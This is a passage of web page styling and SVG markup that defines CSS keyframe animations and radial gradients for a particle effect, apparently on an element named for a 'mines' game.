                              opacity: 1
                            }
                            77.464789%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-14_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(33.917341px, 32.916632px)
                            }
                          }
                          
                          @keyframes particles-u-14_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-15_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            63.380282%,
                            to {
                              transform: translate(3.528999px, 32.792242px)
                            }
                          }
                          
                          @keyframes particles-u-15_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-02_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            35.211268%,
                            to {
                              transform: translate(29.688473px, 4.525965px)
                            }
                          }
                          
                          @keyframes particles-u-02_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-16_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            56.338028%,
                            to {
                              transform: translate(1.597764px, -3.46233px)
                            }
                          }
                          
                          @keyframes particles-u-16_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-s-ellipse2_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            35.211268%,
                            to {
                              transform: translate(29.688473px, 4.525965px)
                            }
                          }
                          
                          @keyframes particles-s-ellipse2_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse4_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            56.338028%,
                            to {
                              transform: translate(1.597764px, -3.46233px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse4_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse5_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            63.380282%,
                            to {
                              transform: translate(3.528999px, 32.792242px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse5_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse6_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(33.917341px, 32.916632px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse6_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-25_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            77.464789%,
                            to {
                              transform: translate(37.253113px, 10.356281px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-25_c_o {
                            0%,
                            49.295775% {
                              opacity: 1
                            }
                            77.464789%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-26_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            70.422535%,
                            to {
                              transform: translate(15.395029px, -1.845621px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-26_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-35_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(23.997808px, .173398px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-35_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-27_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            35.211268%,
                            to {
                              transform: translate(33.101672px, 18.35906px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-27_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-36_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            42.253521%,
                            to {
                              transform: translate(8.434518px, -1.918921px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-36_c_o {
                            0%,
                            14.084507% {
                              opacity: 1
                            }
                            42.253521%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-37_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            56.338028%,
                            to {
                              transform: translate(14.491577px, 35.740187px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-37_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-28_to__to {
                            0% {
                              transform: translate(14.952035px, 16.47642px)
                            }
                            98.591549%,
                            to {
                              transform: translate(-2.487965px, .81642px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-28_c_o {
                            0%,
                            70.422535% {
                              opacity: 1
                            }
                            98.591549%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-38_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(-3.26922px, 12.000411px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-38_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-42_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            91.549296%,
                            to {
                              transform: translate(-1.425767px, 23.851179px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-42_c_o {
                            0%,
                            63.380282% {
                              opacity: 1
                            }
                            91.549296%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-52_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(25.435974px, 35.350813px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-52_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-62_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            38.732394%,
                            to {
                              transform: translate(33.512053px, 25.957982px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-62_c_o {
                            0% {
                              opacity: 1
                            }
                            38.732394%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          #particles-u-6_to {
                            animation: particles-u-6_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-6 {
                            animation: particles-u-6_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-5_to {
                            animation: particles-u-5_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-5 {
                            animation: particles-u-5_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-4_to {
                            animation: particles-u-4_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-4 {
                            animation: particles-u-4_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-3_to {
                            animation: particles-u-3_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-3 {
                            animation: particles-u-3_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-2_to {
                            animation: particles-u-2_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-2 {
                            animation: particles-u-2_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-32_to {
                            animation: particles-u-32_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-32 {
                            animation: particles-u-32_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-33_to {
                            animation: particles-u-33_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-33 {
                            animation: particles-u-33_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-22_to {
                            animation: particles-u-22_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-22 {
                            animation: particles-u-22_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-34_to {
                            animation: particles-u-34_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-34 {
                            animation: particles-u-34_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-23_to {
                            animation: particles-u-23_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-23 {
                            animation: particles-u-23_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-24_to {
                            animation: particles-u-24_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-24 {
                            animation: particles-u-24_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-1_to {
                            animation: particles-u-1_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-1 {
                            animation: particles-u-1_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-12_to {
                            animation: particles-u-12_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-12 {
                            animation: particles-u-12_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-0_to {
                            animation: particles-u-0_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-0 {
                            animation: particles-u-0_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-13_to {
                            animation: particles-u-13_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-13 {
                            animation: particles-u-13_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-s-ellipse1_to {
                            animation: particles-s-ellipse1_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-s-ellipse1 {
                            animation: particles-s-ellipse1_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse_to {
                            animation: particles-u-copy-of-ellipse_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse {
                            animation: particles-u-copy-of-ellipse_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse2_to {
                            animation: particles-u-copy-of-ellipse2_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse2 {
                            animation: particles-u-copy-of-ellipse2_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse3_to {
                            animation: particles-u-copy-of-ellipse3_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse3 {
                            animation: particles-u-copy-of-ellipse3_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-2_to {
                            animation: particles-u-copy-of-ellipse-2_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-2 {
                            animation: particles-u-copy-of-ellipse-2_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-22_to {
                            animation: particles-u-copy-of-ellipse-22_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-22 {
                            animation: particles-u-copy-of-ellipse-22_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-3_to {
                            animation: particles-u-copy-of-ellipse-3_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-3 {
                            animation: particles-u-copy-of-ellipse-3_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-23_to {
                            animation: particles-u-copy-of-ellipse-23_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-23 {
                            animation: particles-u-copy-of-ellipse-23_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-32_to {
                            animation: particles-u-copy-of-ellipse-32_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-32 {
                            animation: particles-u-copy-of-ellipse-32_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-33_to {
                            animation: particles-u-copy-of-ellipse-33_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-33 {
                            animation: particles-u-copy-of-ellipse-33_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-24_to {
                            animation: particles-u-copy-of-ellipse-24_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-24 {
                            animation: particles-u-copy-of-ellipse-24_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-34_to {
                            animation: particles-u-copy-of-ellipse-34_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-34 {
                            animation: particles-u-copy-of-ellipse-34_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-4_to {
                            animation: particles-u-copy-of-ellipse-4_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-4 {
                            animation: particles-u-copy-of-ellipse-4_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-5_to {
                            animation: particles-u-copy-of-ellipse-5_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-5 {
                            animation: particles-u-copy-of-ellipse-5_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-6_to {
                            animation: particles-u-copy-of-ellipse-6_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-6 {
                            animation: particles-u-copy-of-ellipse-6_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-62_to {
                            animation: particles-u-62_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-62 {
                            animation: particles-u-62_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-52_to {
                            animation: particles-u-52_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-52 {
                            animation: particles-u-52_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-42_to {
                            animation: particles-u-42_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-42 {
                            animation: particles-u-42_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-35_to {
                            animation: particles-u-35_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-35 {
                            animation: particles-u-35_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-25_to {
                            animation: particles-u-25_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-25 {
                            animation: particles-u-25_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-36_to {
                            animation: particles-u-36_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-36 {
                            animation: particles-u-36_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-37_to {
                            animation: particles-u-37_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-37 {
                            animation: particles-u-37_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-26_to {
                            animation: particles-u-26_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-26 {
                            animation: particles-u-26_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-38_to {
                            animation: particles-u-38_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-38 {
                            animation: particles-u-38_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-27_to {
                            animation: particles-u-27_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-27 {
                            animation: particles-u-27_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-28_to {
                            animation: particles-u-28_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-28 {
                            animation: particles-u-28_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-14_to {
                            animation: particles-u-14_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-14 {
                            animation: particles-u-14_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-15_to {
                            animation: particles-u-15_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-15 {
                            animation: particles-u-15_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-02_to {
                            animation: particles-u-02_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-02 {
                            animation: particles-u-02_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-16_to {
                            animation: particles-u-16_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-16 {
                            animation: particles-u-16_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-s-ellipse2_to {
                            animation: particles-s-ellipse2_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-s-ellipse2 {
                            animation: particles-s-ellipse2_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse4_to {
                            animation: particles-u-copy-of-ellipse4_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse4 {
                            animation: particles-u-copy-of-ellipse4_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse5_to {
                            animation: particles-u-copy-of-ellipse5_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse5 {
                            animation: particles-u-copy-of-ellipse5_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse6_to {
                            animation: particles-u-copy-of-ellipse6_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse6 {
                            animation: particles-u-copy-of-ellipse6_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-25_to {
                            animation: particles-u-copy-of-ellipse-25_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-25 {
                            animation: particles-u-copy-of-ellipse-25_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-26_to {
                            animation: particles-u-copy-of-ellipse-26_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-26 {
                            animation: particles-u-copy-of-ellipse-26_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-35_to {
                            animation: particles-u-copy-of-ellipse-35_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-35 {
                            animation: particles-u-copy-of-ellipse-35_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-27_to {
                            animation: particles-u-copy-of-ellipse-27_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-27 {
                            animation: particles-u-copy-of-ellipse-27_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-36_to {
                            animation: particles-u-copy-of-ellipse-36_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-36 {
                            animation: particles-u-copy-of-ellipse-36_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-37_to {
                            animation: particles-u-copy-of-ellipse-37_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-37 {
                            animation: particles-u-copy-of-ellipse-37_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-28_to {
                            animation: particles-u-copy-of-ellipse-28_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-28 {
                            animation: particles-u-copy-of-ellipse-28_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-38_to {
                            animation: particles-u-copy-of-ellipse-38_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-38 {
                            animation: particles-u-copy-of-ellipse-38_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-42_to {
                            animation: particles-u-copy-of-ellipse-42_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-42 {
                            animation: particles-u-copy-of-ellipse-42_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-52_to {
                            animation: particles-u-copy-of-ellipse-52_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-52 {
                            animation: particles-u-copy-of-ellipse-52_c_o 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-62_to {
                            animation: particles-u-copy-of-ellipse-62_to__to 1420ms linear normal forwards
                          }
                          
                          #particles-u-copy-of-ellipse-62 {
                            animation: particles-u-copy-of-ellipse-62_c_o 1420ms linear normal forwards
                          }
                        </style>
                        <defs>
                          <radialgradient id="particles-u-6-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-6-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-6-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-6-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-6-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-5-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-5-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-5-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-5-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-5-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-4-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-4-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-4-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-4-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-4-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-3-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-3-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-3-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-3-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-3-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-2-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-2-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-2-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-2-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-2-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-32-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-32-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-32-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-32-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-32-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-33-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-33-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-33-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-33-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-33-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-22-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-22-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-22-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-22-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-22-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-34-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-34-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-34-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-34-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-34-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-23-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-23-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-23-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-23-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-23-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-24-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-24-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-24-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-24-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-24-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-1-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-1-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-1-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-1-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-1-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-12-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-12-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-12-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-12-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-12-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-0-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-0-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-0-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-0-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-0-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-13-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-13-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-13-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-13-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-13-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-62-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-62-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-62-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-62-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
